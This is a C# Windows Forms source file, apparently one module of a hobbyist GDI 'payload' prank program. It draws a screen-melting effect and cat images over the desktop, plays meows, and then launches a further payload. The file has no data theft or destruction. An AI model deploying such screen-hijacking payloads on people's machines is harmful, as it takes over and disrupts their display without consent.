using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using NAudio.Wave;
/* 
        This project was made by S-illy
           https://github.com/S-illy
      Also you can support me with a donation
           https://ko-fi.com/silly69
You can modify this source as you give me credits :D
 
*/
namespace winchancho
{
    public partial class PayloadCat : Form
    {
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern void ReleaseDC(IntPtr hWnd, IntPtr hdc);

        private const uint SRCAND = 0x008800C6;
        private const uint SRCCOPY = 0x00CC0020;

        private System.Windows.Forms.Timer catTimer;
        private System.Windows.Forms.Timer exitTimer;
        private Random random;
        private WaveOutEvent waveOut;
        private string[] catImages = { "cat1", "cat2", "cat3", "cat4", "cat5", "cat6", "cat7" };

        public PayloadCat()
        {
            InitializeComponent();

            random = new Random();
            waveOut = new WaveOutEvent();
            catTimer = new System.Windows.Forms.Timer
            {
                Interval = 10
            };
            catTimer.Tick += CatTimer_Tick;
            catTimer.Start();

            // Timer for the e¿next payload
            exitTimer = new System.Windows.Forms.Timer
            {
                Interval = 39000 // music lenght btw
            };
            exitTimer.Tick += ExitTimer_Tick;
            exitTimer.Start();
        }

        private bool isRaining = true;

        private void CatTimer_Tick(object sender, EventArgs e)
        {
            if (isRaining)
            {
                rain();
            }
            ShowRandomCat();
            PlayMeowSound();
        }

        private void ExitTimer_Tick(object sender, EventArgs e)
        {
            // Stop all
            catTimer.Stop();
            exitTimer.Stop();
            waveOut.Dispose();
            isRaining = false;
            
            // another payload
            Payload5 stuff = new Payload5();
            stuff.Show();
        }


        private void rain() // This was a shitting attemp to melting screen 
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;

            try
            {
                for (int i = 0; i < 10; i++)
                {
                    int xSrc = random.Next(-4, 4);
                    int ySrc = random.Next(1, 10);
                    BitBlt(hdc, 2, ySrc, width, height - ySrc, hdc, 2, 2, SRCCOPY);
                }
            }
            finally
            {
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        private void ShowRandomCat()
        {
            using (Graphics g = Graphics.FromHwnd(IntPtr.Zero))
            {
                Image catImage = (Bitmap)Properties.Resources.ResourceManager.GetObject(catImages[random.Next(catImages.Length)]);
                int x = random.Next(Screen.PrimaryScreen.Bounds.Width - 200);
                int y = random.Next(Screen.PrimaryScreen.Bounds.Height - 200);
                g.DrawImage(catImage, x, y, 200, 200);
            }
        }

        private void PlayMeowSound() // NYANN CATTFKSFKJSDFKJDSF
        {
            if (waveOut.PlaybackState != PlaybackState.Playing)
            {
                var mp3Stream = new System.IO.MemoryStream(Properties.Resources.meow);
                var reader = new Mp3FileReader(mp3Stream);
                waveOut.Init(reader);
                waveOut.Play();
            }
        }

        private void PayloadCat_Load(object sender, EventArgs e)
        {
            this.TransparencyKey = this.BackColor;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
        }
    }
}



/* 
       .                .                    
       :"-.          .-";                    
       |:`.`.__..__.'.';|                    
       || :-"      "-; ||  .----------------------------------.                   
       :;              :;  |  I will do thing to ur computer! |             
       /  .==.    .==.  \ < __________________________________|                          
      :      _.--._      ;          
      ; .--.' `--' `.--. :                 
     :   __;`      ':__   ;                  
     ;  '  '-._:;_.-'  '  :                  
     '.       `--'       .'                  
      ."-._          _.-".                   
    .'     ""------""     `.                 
   /`-                    -'\                
  /`-                      -'\               
 :`-   .'              `.   -';              
 ;    /                  \    :              
:    :                    ;    ;             
;    ;                    :    :             
':_:.'                    '.;_;'             
   :_                      _;                
   ; "-._                -" :`-.     _.._    
   :_           x          _;   "--::__. `.  
    \"-                  -"/`._           :  
   .-"-.                 -"-.  ""--..____.'  
  /         .__  __.         \               
 : / ,       / "" \       . \ ;       
  "-:___..--"      "--..___;-"
 */